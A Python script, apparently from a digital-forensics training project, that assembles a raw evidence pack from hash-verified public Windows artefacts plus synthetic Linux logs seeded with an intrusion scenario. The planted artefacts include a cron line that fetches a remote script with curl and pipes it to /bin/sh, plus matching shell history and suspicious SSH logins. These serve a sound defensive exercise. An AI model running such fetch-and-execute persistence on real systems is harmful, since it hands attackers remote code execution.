"""Assemble public native Windows artefacts and generated raw Linux lab logs."""
import argparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta, timezone
import hashlib
import json
import math
import os
from pathlib import Path, PurePosixPath
import re
import shutil
import tempfile
import urllib.request
import zipfile

TAG = 'raw-artifacts-v1'
ROOT = 'Fireblade-Raw-Artifacts-v1'
ARCHIVE = ROOT + '.zip'
SMALL_URL = 'https://github.com/23R0534ZXT/fireblade/releases/download/test-pack-v1/Fireblade-Test-Pack-v1.zip'
SMALL_SHA256 = 'a546e3eac159f6e9a9e9c90360f4f89bec5d9bd1ebe7d86bf7fc23a6d2dccb9f'
GIB = 1024 ** 3
MIB = 1024 ** 2


def digest(path):
    with Path(path).open('rb') as stream:
        return hashlib.file_digest(stream, 'sha256').hexdigest()


def safe_relative(name):
    if not isinstance(name, str) or not name or '\\' in name or '\0' in name:
        raise ValueError('Invalid archive path')
    parts = name.rstrip('/').split('/')
    if any(part in ('', '.', '..') or re.search(r'[<>:"|?*\x00-\x1f]', part)
           or part.rstrip(' .') != part for part in parts):
        raise ValueError('Unsafe archive path')
    if PurePosixPath(name).is_absolute():
        raise ValueError('Absolute archive path')
    return Path(*parts)


def download(url, target, sha256, expected_bytes=None):
    target = Path(target)
    if target.exists() and digest(target) == sha256:
        return target
    target.parent.mkdir(parents=True, exist_ok=True)
    partial = target.with_suffix('.partial')
    try:
        with urllib.request.urlopen(url, timeout=120) as incoming, partial.open('wb') as output:
            total = 0
            while block := incoming.read(MIB):
                total += len(block)
                if total > 512 * MIB or expected_bytes is not None and total > expected_bytes:
                    raise ValueError('Source download exceeds its declared size')
                output.write(block)
        if expected_bytes is not None and total != expected_bytes or digest(partial) != sha256:
            raise ValueError('Source size/SHA-256 mismatch: ' + url)
        os.replace(partial, target)
    finally:
        partial.unlink(missing_ok=True)
    return target


def write_linux_file(path, host, kind, target_bytes, sequence=0):
    path.parent.mkdir(parents=True, exist_ok=True)
    start = datetime(2026, 11, 1, 10, tzinfo=timezone.utc)
    lines = written = 0
    landmarks = []
    with path.open('wb', buffering=MIB) as stream:
        while written < target_bytes:
            number = sequence * 1_000_000 + lines
            stamp = start + timedelta(milliseconds=number * 100)
            iso = stamp.isoformat(timespec='milliseconds').replace('+00:00', 'Z')
            user = ('alice', 'bob', 'backup', 'deploy')[number % 4]
            remote = f'192.0.2.{1 + number % 200}'
            pid = 1000 + number % 30000
            if kind == 'audit':
                suspicious = sequence == 0 and lines == 1002
                command = '/usr/bin/curl' if suspicious else '/usr/bin/stat'
                text = (f'type=SYSCALL msg=audit({stamp.timestamp():.3f}:{number + 1}): arch=c000003e syscall=59 success=yes exit=0 '
                        f'pid={pid} ppid=1000 uid=1001 comm="{Path(command).name}" exe="{command}" '
                        f'host={host} path="/etc/cron.d/ops-sync"' if suspicious else
                        f'type=SYSCALL msg=audit({stamp.timestamp():.3f}:{number + 1}): arch=c000003e syscall=4 success=yes exit=0 '
                        f'pid={pid} ppid=1000 uid=1000 comm="stat" exe="/usr/bin/stat" host={host} path="/srv/jobs/{number:010d}.dat"')
            elif kind == 'auth':
                suspicious = sequence == 0 and lines in (1000, 1001)
                if suspicious:
                    remote, user = '198.51.100.42', 'backup'
                outcome = 'Accepted' if suspicious and lines == 1001 or not suspicious and number % 10 else 'Failed'
                text = f'{iso} {host} sshd[{pid}]: {outcome} password for {user} from {remote} port {10000 + number % 50000} ssh2 session={number:012d}'
            else:
                suspicious = sequence == 0 and lines == 1003
                message = 'ops-sync.service: Started /usr/bin/curl https://updates.example.test/sync.sh' if suspicious else f'Finished job-{number:012d}.service user={user} result=success duration_ms={1 + number % 2000}'
                text = f'{iso} {host} systemd[1]: {message}'
            data = (text + '\n').encode('utf-8')
            stream.write(data)
            written += len(data)
            lines += 1
            if suspicious:
                landmarks.append(dict(line=lines, text=text, time=iso))
    return dict(lines=lines, bytes=written, kind=kind, host=host, landmarks=landmarks)


def add_linux(root, target_bytes):
    """Use collector-style paths with original syslog/audit text, no parsed CSV."""
    directory = root / '02-Linux-CatScale'
    files, metadata = [], []
    chunks = max(12, math.ceil(target_bytes / (64 * MIB)))
    for index in range(chunks):
        host = f'lab-edge-{index % 4 + 1:02}'
        kind = ('auth', 'audit', 'syslog')[(index // 4) % 3]
        sequence = index // 12
        base = directory / host / 'catscale_out'
        path = base / 'Logs' / f'{kind}-{sequence:03}.log'
        result = write_linux_file(path, host, kind, 64 * MIB, sequence)
        metadata.append(dict(path=path.relative_to(root).as_posix(), **result))
        files.append(path)
        print(f'Raw Linux log {index + 1}/{chunks}: {path.name}, {result["lines"]} lines', flush=True)
    for host in sorted(directory.iterdir()):
        base = host / 'catscale_out'
        values = {
            'Process_and_Network/lab-20261101-1000-processes-ef.txt': 'UID PID PPID C STIME TTY TIME CMD\nbackup 2001 1 0 10:01 ? 00:00 /usr/bin/curl https://updates.example.test/sync.sh\n',
            'Process_and_Network/lab-20261101-1000-ss-anepo.txt': 'Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\ntcp ESTAB 0 0 192.0.2.10:22 198.51.100.42:45000 users:(("sshd",pid=2000,fd=3))\n',
            'Persistence/lab-20261101-1000-cron-tab-list.txt': 'backup\n@reboot /usr/bin/curl https://updates.example.test/sync.sh | /bin/sh\nENDOFUSERCRON\n',
            'User_Files/home/backup/bash_history': '#1793527300\nwhoami\ncurl https://updates.example.test/sync.sh\n',
            'System_Info/lab-20261101-1000-release.txt': 'NAME="Fireblade synthetic Linux lab"\nTIMEZONE=UTC\n',
        }
        for relative, text in values.items():
            path = base / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text, encoding='utf-8')
            files.append(path)
    return files, metadata


def build(directory, cache, target_gib=3):
    if not 3 <= target_gib <= 4:
        raise ValueError('This exercise supports 3 to 4 GiB of raw input')
    project = Path(__file__).resolve().parents[2]
    lock = json.loads((project / 'config/raw-pack-sources.json').read_text(encoding='utf-8'))
    directory, cache = Path(directory).resolve(), Path(cache).resolve()
    directory.mkdir(parents=True, exist_ok=False)
    root = directory / ROOT
    root.mkdir()
    sources = lock['sources']
    def fetch(item):
        return download(item['url'], cache / item['git_blob'], item['sha256'], item['bytes'])
    unique = {item['git_blob']: item for item in sources}
    with ThreadPoolExecutor(max_workers=4) as pool:
        fetched = dict(zip(unique, pool.map(fetch, unique.values())))
    downloaded = [fetched[item['git_blob']] for item in sources]
    provenance, skipped = {}, []
    for number, (item, source) in enumerate(zip(sources, downloaded)):
        case = safe_relative(item['case'])
        family = safe_relative(item['family'])
        folder = root / '01-Windows' / case / family / item['git_blob'][:12]
        folder.mkdir(parents=True, exist_ok=True)
        name = Path(item['filename']).name
        if name.casefold().endswith('.7z'):
            import py7zr
            with py7zr.SevenZipFile(source) as archive:
                entries = archive.list()
                for entry in entries:
                    safe_relative(entry.filename)
                if sum(entry.uncompressed for entry in entries) > GIB:
                    raise ValueError('Unexpectedly large source archive')
                with tempfile.TemporaryDirectory(dir=directory, prefix='.extract-') as scratch:
                    archive.extractall(scratch)
                    for path in sorted(Path(scratch).rglob('*')):
                        if path.is_symlink():
                            raise ValueError('Source archive contains a symbolic link')
                        if not path.is_file():
                            continue
                        relative = path.relative_to(scratch)
                        if path.suffix.casefold() in ('.exe', '.dll', '.bat', '.cmd', '.ps1', '.csv', '.xlsx'):
                            skipped.append(dict(source=item['path'], member=relative.as_posix(), reason='Not a raw input'))
                            continue
                        target = folder / relative
                        target.parent.mkdir(parents=True, exist_ok=True)
                        shutil.copyfile(path, target)
                        provenance[target.relative_to(root).as_posix()] = dict(kind='public-native', source=item['path'], archive_sha256=item['sha256'])
        elif name.casefold().endswith('.zip'):
            raise ValueError('ZIP sources must be explicitly reviewed before inclusion')
        else:
            target = folder / safe_relative(name)
            shutil.copyfile(source, target)
            provenance[target.relative_to(root).as_posix()] = dict(kind='public-native', source=item['path'], sha256=item['sha256'])
        if number % 100 == 0:
            print(f'Prepared public source {number + 1}/{len(sources)}', flush=True)
    # Retain the small pack's native references and notices, never its CSV exports.
    reference = download(SMALL_URL, cache / 'reference-native.zip', SMALL_SHA256)
    with zipfile.ZipFile(reference) as archive:
        for info in archive.infolist():
            parts = PurePosixPath(info.filename).parts
            if len(parts) < 3 or parts[1] not in ('01-Windows', 'NOTICES'):
                continue
            prefix = '01-Windows/Reference-Readers' if parts[1] == '01-Windows' else 'NOTICES'
            target = root / prefix / safe_relative('/'.join(parts[2:]))
            target.parent.mkdir(parents=True, exist_ok=True)
            with archive.open(info) as incoming, target.open('wb') as output:
                shutil.copyfileobj(incoming, output)
            provenance[target.relative_to(root).as_posix()] = dict(kind='public-native' if parts[1] == '01-Windows' else 'notice', source=SMALL_URL, archive_sha256=SMALL_SHA256)
    windows_bytes = sum(path.stat().st_size for path in (root / '01-Windows').rglob('*') if path.is_file())
    linux_files, logs = add_linux(root, max(GIB, math.ceil(target_gib * GIB) - windows_bytes + 64 * MIB))
    for path in linux_files:
        provenance[path.relative_to(root).as_posix()] = dict(kind='synthetic-raw-linux', license='MIT')
    (root / 'SOURCES.json').write_text(json.dumps(dict(repository=lock['repository'], commit=lock['commit'], license=lock['license'], sources=sources, skipped=skipped), ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
    (root / 'SCENARIO-LINUX.json').write_text(json.dumps(dict(synthetic=True, timezone='UTC', suspicious_ip='198.51.100.42', suspicious_user='backup', persistence='/etc/cron.d/ops-sync', domain='updates.example.test', logs=logs), ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
    guide = project / 'docs/guides/PACK-BRUT.md'
    shutil.copyfile(guide, root / 'LIRE-MOI.md')
    records = []
    for path in sorted(root.rglob('*')):
        if path.is_file():
            relative = path.relative_to(root).as_posix()
            records.append(dict(path=relative, bytes=path.stat().st_size, sha256=digest(path), origin=provenance.get(relative, dict(kind='metadata'))))
    raw_bytes = sum(item['bytes'] for item in records if item['origin']['kind'] in ('public-native', 'synthetic-raw-linux'))
    if raw_bytes < target_gib * GIB:
        raise ValueError('Raw input size target was not reached')
    manifest = dict(format='fireblade-raw-pack', version=1, raw_bytes=raw_bytes, windows_bytes=windows_bytes, linux_raw_bytes=sum(p.stat().st_size for p in linux_files), files=records)
    (root / 'MANIFEST.json').write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + '\n', encoding='utf-8')
    return manifest


def archive_pack(directory):
    directory = Path(directory)
    root = directory / ROOT
    target = directory / ARCHIVE
    with zipfile.ZipFile(target, 'w', compression=zipfile.ZIP_DEFLATED, compresslevel=1, allowZip64=True) as archive:
        for path in sorted(root.rglob('*')):
            if path.is_file():
                archive.write(path, ROOT + '/' + path.relative_to(root).as_posix())
    if target.stat().st_size >= 2 * GIB:
        raise ValueError('Archive exceeds the GitHub asset size limit; split the pack before publication')
    return dict(name=ARCHIVE, bytes=target.stat().st_size, sha256=digest(target))


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--out', type=Path, required=True)
    parser.add_argument('--cache', type=Path, required=True)
    args = parser.parse_args()
    print(json.dumps(build(args.out, args.cache), ensure_ascii=False)[:1000])


if __name__ == '__main__':
    main()
